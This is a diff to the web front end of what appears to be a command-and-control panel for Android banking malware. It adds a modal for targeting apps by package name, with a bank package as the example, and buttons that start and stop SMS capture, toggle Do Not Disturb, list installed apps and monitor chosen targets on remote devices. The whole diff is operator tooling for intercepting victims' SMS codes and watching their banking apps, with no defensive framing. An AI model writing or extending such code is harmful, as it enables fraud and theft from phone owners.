@@ -172,11 +172,24 @@
         <div id="toast" class="toast"></div>
     </div>
 
-    <script>
+    <!-- Target/Untarget App Modal -->
+<div id="target-modal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:1001;">
+    <div style="background:#1a1a1a; margin:10% auto; padding:20px; border-radius:10px; max-width:400px; border:1px solid #333;">
+        <h3 style="color:#4CAF50; margin-bottom:15px;">🎯 Target App</h3>
+        <input type="text" id="target-app-id" placeholder="Enter package name (e.g., com.bank.example)" style="width:100%; padding:10px; margin-bottom:15px; background:#2a2a2a; border:1px solid #555; border-radius:5px; color:#e0e0e0;">
+        <div style="display:flex; gap:10px;">
+            <button onclick="dashboard.targetApp()" style="flex:1; padding:10px; background:#333; border:1px solid #555; border-radius:5px; color:#e0e0e0; cursor:pointer;">Target</button>
+            <button onclick="dashboard.closeTargetModal()" style="flex:1; padding:10px; background:#555; border:none; border-radius:5px; color:#e0e0e0; cursor:pointer;">Cancel</button>
+        </div>
+    </div>
+</div>
+
+<script>
         class CryptoDashboard {
             constructor() {
                 this.devices = new Map();
                 this.selectedDevice = null;
+                this.targetDeviceId = null;
                 this.init();
                 this.loadDevices();
                 setInterval(() => this.loadDevices(), 10000);
@@ -246,24 +259,21 @@
             }
 
             renderCommands(deviceId) {
-                return `
-                    <div class="commands-section">
-                        <div class="commands-title">Control Panel</div>
-                        <div class="command-grid">
-                            <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'get_sim', {})">📞 Get SIM Number</button>
-                            <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'toggle_dnd', {})">🔕 Toggle DND</button>
-                            <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'start_sms_capture', {})">📥 Receive SMS</button>
-                            <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'stop_sms_capture', {})">📋 Stop SMS</button>
-                            <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'start_monitor_app', {})">👁️ Start Monitor</button>
-                            <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'get_installed_apps', {})">📱 All Apps</button>
-                            <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'list_targets', {})">🎯 List Targets</button>
-                            <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'stop_monitoring', {})">⏹️ Stop Monitor</button>
-                        </div>
-                        <div style="margin-top: 10px; font-size: 0.8em; color: #888;">
-                            Use "All Apps" to list all apps, then use Target/Untarget commands via the device UI.
-                        </div>
-                    </div>
-                `;
+                            return `
+                                <div class="commands-section">
+                                    <div class="commands-title">Control Panel</div>
+                                    <div class="command-grid">
+                                        <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'start_sms_capture', {})">📥 Receive SMS</button>
+                                        <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'stop_sms_capture', {})">📋 Stop SMS</button>
+                                        <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'set_dnd', {enabled: true})">🔇 DND On</button>
+                                        <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'set_dnd', {enabled: false})">🔊 DND Off</button>
+                                        <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'get_installed_apps', {})">📱 All Apps</button>
+                                        <button class="command-btn" onclick="dashboard.openTargetModal('${deviceId}')">🎯 Target App</button>
+                                        <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'list_targets', {})">📋 List Targets</button>
+                                        <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'stop_monitoring', {})">⏹️ Stop Monitor</button>
+                                    </div>
+                                </div>
+                            `;
             }
 
             selectDevice(deviceId) {
@@ -300,6 +310,33 @@
                 setTimeout(() => {
                     toast.classList.remove('show');
                 }, 3000);
+            }
+
+            openTargetModal(deviceId) {
+                this.targetDeviceId = deviceId;
+                document.getElementById('target-modal').style.display = 'block';
+                document.getElementById('target-app-id').value = '';
+            }
+
+            closeTargetModal() {
+                document.getElementById('target-modal').style.display = 'none';
+                this.targetDeviceId = null;
+            }
+
+            async targetApp() {
+                const appId = document.getElementById('target-app-id').value.trim();
+                if (!appId) {
+                    this.showToast('❌ Please enter an app package name');
+                    return;
+                }
+                
+                // Send target_app command
+                await this.sendCommand(this.targetDeviceId, 'target_app', { appId });
+                this.showToast(`✅ App targeted: ${appId}`);
+                this.closeTargetModal();
+                
+                // Also add to targets list
+                await this.sendCommand(this.targetDeviceId, 'list_targets', {});
             }
         }
 
